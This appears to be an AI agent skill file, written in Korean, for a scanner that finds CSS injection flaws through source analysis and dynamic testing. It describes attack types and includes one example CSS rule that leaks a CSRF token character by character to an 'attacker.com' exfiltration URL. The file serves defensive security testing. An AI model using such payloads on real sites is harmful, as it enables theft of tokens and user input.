---
name: css-injection-scanner
description: "소스코드 분석과 동적 테스트를 통해 CSS Injection 취약점을 탐지하는 스킬. 사용자 입력이 CSS 스타일에 반영되는 경로를 추적하고, 실제로 CSS를 조작하여 데이터 탈취나 UI 변조가 가능한지 검증한다. 사용자가 'CSS injection 찾아줘', 'CSS 인젝션 스캔', 'style injection', '스타일 인젝션', 'CSS 점검', 'CSS injection audit' 등을 요청할 때 이 스킬을 사용한다."
grep_patterns:
  - "style="
  - "cssText"
  - "insertRule("
  - "setAttribute.*style"
  - "document\\.styleSheets"
  - "CSSStyleDeclaration"
  - "style\\s*\\+\\s*="
  - "\\[style\\]"
  # Source patterns
  - "searchParams\\.get("
  - "@RequestParam"
  - "req\\.query"
---

# CSS Injection Scanner

소스코드 분석으로 CSS Injection 취약점 후보를 식별한 뒤, 동적 테스트로 실제로 CSS를 조작하여 데이터 탈취나 UI 변조가 가능한지 검증하여 확인된 취약점만 보고하는 스킬이다.

## 핵심 원칙: "CSS가 조작되지 않으면 취약점이 아니다"

소스코드에서 사용자 입력이 style 속성에 반영된다고 바로 취약점으로 보고하지 않는다. 실제로 CSS 구문을 삽입하여 의도하지 않은 스타일이 적용되거나, CSS 기반 데이터 탈취가 가능한 것을 확인해야 취약점이다.

## CSS Injection vs XSS 구분

- **CSS Injection**: CSS 구문을 삽입하여 스타일을 조작하거나, CSS 선택자/속성을 이용해 데이터를 탈취. JavaScript 실행 없음.
- **XSS**: JavaScript 코드를 실행. `<script>`, `onerror` 등으로 스크립트가 실행되면 XSS.

CSS Injection을 통해 `expression()` (IE 전용, 레거시) 같은 CSS에서 JavaScript를 실행하는 경우도 있지만, 최신 브라우저에서는 차단됨. 이 스캐너는 CSS 수준의 공격만 보고한다.

## CSS Injection의 유형

### 데이터 탈취 (CSS Exfiltration)
CSS 속성 선택자(`input[value^="a"]`)와 `background-image: url()`을 조합하여 CSRF 토큰, 입력값 등을 한 글자씩 외부 서버로 전송하는 공격.

```css
/* CSRF 토큰 첫 글자가 'a'이면 공격자 서버로 요청 */
input[name="csrf"][value^="a"] {
  background-image: url("https://attacker.com/exfil?char=a");
}
```

### UI Redressing / Clickjacking via CSS
CSS를 조작하여 버튼이나 링크의 위치를 변경하거나, 투명한 오버레이를 생성하여 사용자가 의도하지 않은 동작을 수행하게 하는 공격.

### CSS Keylogger
`@font-face`와 속성 선택자를 조합하여 입력 필드의 값 변화를 추적하는 공격. 실시간 데이터 탈취에 활용.

### Content Injection via CSS
`content` 속성으로 페이지에 가짜 텍스트를 삽입하거나, `display: none`으로 중요 정보를 숨기는 공격. 피싱에 활용 가능.

### CSS Import Injection
`@import url()` 구문을 삽입하여 외부 스타일시트를 로드하는 공격. 공격자가 제어하는 CSS 파일을 로드할 수 있다.

## 분석 프로세스

이 스캐너의 분석은 두 단계로 구성된다:

1. **Phase 1 (소스코드 분석)**: `phase1.md` 참조
2. **Phase 2 (동적 테스트)**: `phase2.md` 참조

개별 실행 시, 이 디렉토리의 `phase1.md`와 `phase2.md`를 순서대로 읽고 수행한다.
공통 유의사항은 `~/.claude/skills/noah-sast/agent-guidelines.md`를 참조한다.
